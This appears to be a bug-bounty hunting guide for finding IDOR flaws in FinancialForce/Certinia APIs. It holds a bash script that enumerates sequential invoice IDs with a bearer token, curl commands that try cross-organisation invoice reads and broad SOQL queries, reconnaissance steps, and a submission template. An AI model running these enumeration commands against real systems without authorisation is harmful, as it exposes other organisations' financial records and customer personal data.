# 🎯 FinancialForce/Certinia IDOR Hunt - Live Scope

> Target: `*.financialforce.com` + `*.certinia.com` | Payouts: $3k-$4.5k (P1) | Rate Limit: 5 req/sec MAX

---

## 📋 Quick Reference

| Tier | Payout | Target |
|------|--------|--------|
| **P1** 🔴 | $3,000-$4,500 | CRITICAL IDOR, Account Takeover, RCE |
| **P2** 🟠 | $1,337-$2,000 | HIGH severity, Auth Bypass, Data Breach |
| **P3** 🟡 | $500-$750 | MEDIUM, Limited Access, Info Disclosure |
| **P4** 🟢 | $175-$350 | LOW, XSS, CSRF, Weak Headers |

**You want P1 = $3k-$4.5k for IDOR** ✅

---

## ⚠️ CRITICAL: Rate Limiting

```
MAXIMUM: 5 requests per second
MINIMUM: 200ms between requests (to be safe)

DON'T DO THIS:
for i in {1..100}; do curl ... & done  # Too fast, will get blocked

DO THIS:
for i in {1..100}; do
  curl ...
  sleep 0.25  # 250ms = safe
done
```

---

## 🔍 Phase 1: Recon (Slow & Careful)

### 1.1 Subdomain Enumeration
```bash
# Passive only (don't hammer the servers)
subfinder -d financialforce.com -all -silent
subfinder -d certinia.com -all -silent

# Expected results:
# - app.financialforce.com
# - api.financialforce.com
# - api.certinia.com
# - dev.*.financialforce.com (maybe)
```

### 1.2 API Endpoint Discovery (Via Burp)

**Setup Burp:**
1. Open Burp Suite
2. Proxy: 127.0.0.1:8080
3. Navigate to: https://app.financialforce.com (or whoever's URL they give you)
4. Login with your test account
5. **Click through the app slowly:**
   - Dashboard
   - Invoices
   - Accounts
   - Projects
   - Transactions
   - Profile

**Burp captures all API calls** → Extract endpoints

---

## 🎯 Phase 2: IDOR Testing (5 req/sec LIMIT)

### 2.1 Safe IDOR Testing Script

```bash
#!/bin/bash

TOKEN="YOUR_BEARER_TOKEN"
BASE_URL="https://api.financialforce.com"  # Adjust based on scope

DELAY=0.25  # 250ms between requests (4 req/sec, safe)

# Test invoice IDOR
echo "[*] Testing Invoice IDOR..."

for i in {1..20}; do
  invoice_id=$(printf "801D00000000%04d" $i)
  
  response=$(curl -s -H "Authorization: Bearer $TOKEN" \
    "$BASE_URL/services/apexrest/v2/invoices/$invoice_id" \
    -w "\n%{http_code}")
  
  http_code=$(echo "$response" | tail -1)
  body=$(echo "$response" | head -1)
  
  if [ "$http_code" = "200" ]; then
    echo "[+] ✅ FOUND: $invoice_id | $body"
  elif [ "$http_code" = "403" ]; then
    echo "[-] 403 (auth check working): $invoice_id"
  fi
  
  sleep $DELAY  # RESPECT RATE LIMIT
done
```

### 2.2 Target Endpoints (Priority Order)

**HIGH PAYOUT TARGETS (P1):**

1. **Invoices** (Financial data = critical)
   ```
   GET /services/apexrest/v2/invoices
   GET /services/apexrest/v2/invoices/{id}
   ```
   Test: Can you read another org's invoices?

2. **Accounts** (Customer/account data = critical)
   ```
   GET /services/apexrest/v2/accounts
   GET /services/apexrest/v2/accounts/{id}
   ```
   Test: Can you enumerate all accounts in system?

3. **Transactions** (Financial audit trail)
   ```
   GET /services/apexrest/AccountingTransaction
   GET /services/apexrest/AccountingTransaction/{id}
   ```
   Test: Can you read another org's transactions?

4. **SOQL Injection** (Unrestricted queries = CRITICAL)
   ```
   GET /services/data/v62.0/query?q=SELECT+*+FROM+Invoice
   ```
   Test: Can you query all data in system?

**MEDIUM PAYOUT TARGETS (P2/P3):**

5. **Projects**
   ```
   GET /services/apexrest/projects
   GET /services/apexrest/projects/{id}
   ```

6. **Employees/Resources**
   ```
   GET /services/apexrest/resources
   GET /services/apexrest/timecards
   ```

---

## 💻 Actual Hunting Commands

### Command 1: Get Your Invoice List (Baseline)
```bash
TOKEN="your_token_here"

curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.financialforce.com/services/apexrest/v2/invoices?limit=5" \
  | jq .
```

### Command 2: Try Reading Another Invoice (IDOR Test)
```bash
# If your invoice ID is: 801D000000ABC123
# Try: 801D000000ABC124 (next one)

curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.financialforce.com/services/apexrest/v2/invoices/801D000000ABC124" \
  | jq .
```

**If you get 200 + data = IDOR FOUND** ✅

### Command 3: SOQL Query (All Invoices)
```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.financialforce.com/services/data/v62.0/query?q=SELECT+Id,InvoiceNumber,Amount+FROM+Invoice" \
  | jq .
```

**If returns 200 + multiple orgs' data = CRITICAL** ✅

---

## 📝 PoC Template (P1 Submission)

When you find IDOR, submit this format:

```markdown
## Vulnerability: Cross-Organization Invoice Access (IDOR)

### Severity
**P1 (Critical)** - CVSS 9.1

### Summary
FinancialForce API fails to validate user org ownership of invoices, allowing 
cross-org read access to sensitive financial data.

### Affected Endpoints
- GET `/services/apexrest/v2/invoices/{invoiceId}`
- GET `/services/apexrest/v2/accounts/{accountId}`

### Steps to Reproduce
1. Login to your test account (Org A)
2. Query: GET /services/apexrest/v2/invoices
3. Get your invoice ID (e.g., 801D000000ABC123)
4. Change to: GET /services/apexrest/v2/invoices/801D000000ABC124
5. Server returns Org B's invoice without validation

### Impact
- Read all invoices in FinancialForce (cross-org breach)
- Financial data exposure (amounts, customers, dates)
- PII leak (customer names, emails)
- Competitive intelligence (pricing, customers)

### CVSS Score
9.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

### PoC Request/Response
[Paste HTTP request + response showing unauthorized data access]

### Remediation
Validate user's org ownership before returning invoice data.
```

---

## ⏱️ Your Timeline (Next 2 Hours)

**Hour 1:**
- [ ] Get your Bearer token from Burp
- [ ] Extract 5-10 API endpoints from traffic
- [ ] Test invoices endpoint (sequential IDs)
- [ ] Test accounts endpoint
- [ ] Test SOQL query

**Hour 2:**
- [ ] If IDOR found: Document PoC
- [ ] If no IDOR: Pivot to other endpoints
- [ ] Submit P1 finding to Bugcrowd
- [ ] **Start hunting other endpoints**

---

## 🚨 Key Reminders

✅ **DO:**
- Test with 0.25s delays (5 req/sec safe)
- Focus on invoices/accounts first (high payout)
- Document everything
- Test sequential ID patterns (common in Salesforce)

❌ **DON'T:**
- Exceed 5 requests/sec (you'll get blocked)
- Modify data (POST/PUT/DELETE) without explicit permission
- Fuzz endpoints aggressively
- Use automated scanners without rate limiting

---

## 🎯 Success Metric

**P1 IDOR found** = Read unauthorized invoice/account data = **$3,000-$4,500** 💰

Let's go! 🔫
